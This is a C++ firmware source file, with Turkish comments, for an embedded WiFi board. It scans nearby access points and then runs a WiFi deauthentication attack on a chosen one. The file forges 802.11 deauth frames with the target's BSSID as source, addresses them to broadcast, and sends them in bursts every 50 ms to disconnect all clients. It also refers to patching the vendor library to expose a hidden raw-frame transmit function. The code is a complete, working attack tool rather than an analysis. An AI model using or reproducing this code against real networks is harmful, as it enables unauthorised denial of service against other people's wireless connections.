#include "deauth.h"
#include "definitions.h"
#include <WiFi.h>

// ── SDK 3.2.0 alt seviye WiFi API ────────────────────────────────────────────
// wifi_conf.h: wifi_scan_networks() + rtw_scan_result_t (BSSID, kanal dahil)
// wifi_send_raw_frame: lib_wlan.a'da gizli sembol, patch_lib.bat ile acilir.
extern "C" {
  #include "wifi_conf.h"

  int wifi_send_raw_frame(unsigned int intf,
                          unsigned char *buf,
                          unsigned int   buf_len);
  int wifi_set_channel(unsigned char channel);
}

// ── Tarama sonuclari ─────────────────────────────────────────────────────────
NetInfo net_list[MAX_NETWORKS];
int     net_count = 0;

// ── Deauth durumu ─────────────────────────────────────────────────────────────
bool deauth_active   = false;
char deauth_ssid[33] = {0};

static int           _deauth_channel = 1;
static uint8_t       _target_bssid[6] = {0};
static unsigned long _last_send = 0;

#define DEAUTH_INTERVAL_MS  50
#define DEAUTH_BURST         5

// ── 802.11 Deauth cercevesi (26 byte) ────────────────────────────────────────
//  [FC:2][DUR:2][DA:6][SA:6][BSSID:6][SEQ:2][REASON:2]
static uint8_t _frame[26] = {
  0xC0, 0x00,                          // Frame Control: Deauthentication
  0x3A, 0x01,                          // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast (tum istemciler)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: hedef AP'nin BSSID'si
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: hedef AP'nin BSSID'si
  0x00, 0x00,                          // Sequence
  0x07, 0x00                           // Reason: Class 3 from non-assoc STA
};

static void _build_frame() {
  memcpy(_frame + 10, _target_bssid, 6);  // SA = AP BSSID
  memcpy(_frame + 16, _target_bssid, 6);  // BSSID = AP BSSID
}

static void _send_burst() {
  static uint16_t seq = 0;
  for (int i = 0; i < DEAUTH_BURST; i++) {
    seq += 0x10;
    _frame[22] = (uint8_t)(seq & 0xFF);
    _frame[23] = (uint8_t)(seq >> 8);
    wifi_send_raw_frame(0, _frame, sizeof(_frame));
  }
}

// ── Guvenlik tipi -> enc etiketi ─────────────────────────────────────────────
// rtw_security_t degerlerini web arayuzundeki enc koduna cevir.
static uint8_t _sec_to_enc(uint32_t sec) {
  if (sec == RTW_SECURITY_OPEN)                        return 7; // OPEN
  if (sec == RTW_SECURITY_WEP_PSK ||
      sec == RTW_SECURITY_WEP_SHARED)                  return 5; // WEP
  return 4;                                                       // WPA/WPA2/WPA3
}

// ── Tarama callback'i (wifi_scan_networks tarafindan her AP icin cagirilir) ──
static volatile bool _scan_done = false;

static rtw_result_t _scan_cb(rtw_scan_handler_result_t* result) {
  if (result->scan_complete != RTW_FALSE) {
    _scan_done = true;
    return RTW_SUCCESS;
  }
  if (net_count >= MAX_NETWORKS) return RTW_SUCCESS;

  rtw_scan_result_t* ap = &result->ap_details;

  // SSID
  int slen = ap->SSID.len < 32 ? ap->SSID.len : 32;
  memcpy(net_list[net_count].ssid, ap->SSID.val, slen);
  net_list[net_count].ssid[slen] = '\0';

  // BSSID (gercek MAC adresi)
  memcpy(net_list[net_count].bssid, ap->BSSID.octet, 6);

  // Kanal (gercek kanal)
  net_list[net_count].channel = ap->channel;

  // RSSI
  net_list[net_count].rssi = (int32_t)ap->signal_strength;

  // Sifreleme
  net_list[net_count].enc = _sec_to_enc((uint32_t)ap->security);

  DBG(net_count); DBG(F(": ")); DBG(net_list[net_count].ssid);
  DBG(F("  ch")); DBG(net_list[net_count].channel);
  DBG(F("  ")); DBG(net_list[net_count].rssi); DBG(F(" dBm  BSSID: "));
  for (int j = 0; j < 6; j++) {
    if (net_list[net_count].bssid[j] < 0x10) DBG('0');
    DBG(net_list[net_count].bssid[j], HEX);
    if (j < 5) DBG(':');
  }
  DBGLN("");

  net_count++;
  return RTW_SUCCESS;
}

// ── Ag taramasi ──────────────────────────────────────────────────────────────
void scan_networks() {
  DBGLN(F("[SCAN] Basliyor..."));
  net_count  = 0;
  _scan_done = false;

  int ret = wifi_scan_networks(_scan_cb, NULL);
  if (ret != RTW_SUCCESS) {
    DBGLN(F("[SCAN] HATA: wifi_scan_networks basarisiz!"));
    return;
  }

  // Taramanin bitmesini bekle (max 8 sn)
  unsigned long timeout = millis() + 8000UL;
  while (!_scan_done && millis() < timeout) {
    delay(100);
  }

  if (!_scan_done) {
    DBGLN(F("[SCAN] Zaman asimi!"));
  }

  DBG(F("[SCAN] Tamamlandi. Bulunan ag: ")); DBGLN(net_count);
}

// ── Deauth baslat ─────────────────────────────────────────────────────────────
void deauth_start(int net_idx) {
  if (net_idx < 0 || net_idx >= net_count) return;

  deauth_stop();

  strncpy(deauth_ssid, net_list[net_idx].ssid, 32);
  deauth_ssid[32] = '\0';
  memcpy(_target_bssid, net_list[net_idx].bssid, 6);
  _deauth_channel = net_list[net_idx].channel;
  if (_deauth_channel < 1 || _deauth_channel > 14) _deauth_channel = 1;

  wifi_set_channel((unsigned char)_deauth_channel);
  _build_frame();

  deauth_active = true;
  _last_send    = 0;

  DBG(F("[DEAUTH] Hedef SSID : ")); DBGLN(deauth_ssid);
  DBG(F("[DEAUTH] Kanal      : ")); DBGLN(_deauth_channel);
  DBG(F("[DEAUTH] BSSID      : "));
  for (int i = 0; i < 6; i++) {
    if (_target_bssid[i] < 0x10) DBG('0');
    DBG(_target_bssid[i], HEX);
    if (i < 5) DBG(':');
  }
  DBGLN("");
  DBGLN(F("[DEAUTH] Gonderim baslatildi"));
}

// ── Deauth durdur ─────────────────────────────────────────────────────────────
void deauth_stop() {
  deauth_active  = false;
  deauth_ssid[0] = '\0';
  DBGLN(F("[DEAUTH] Durduruldu"));
}

// ── Deauth dongusu ────────────────────────────────────────────────────────────
void deauth_loop() {
  if (!deauth_active) return;
  unsigned long now = millis();
  if (now - _last_send >= DEAUTH_INTERVAL_MS) {
    _last_send = now;
    _send_burst();
  }
}
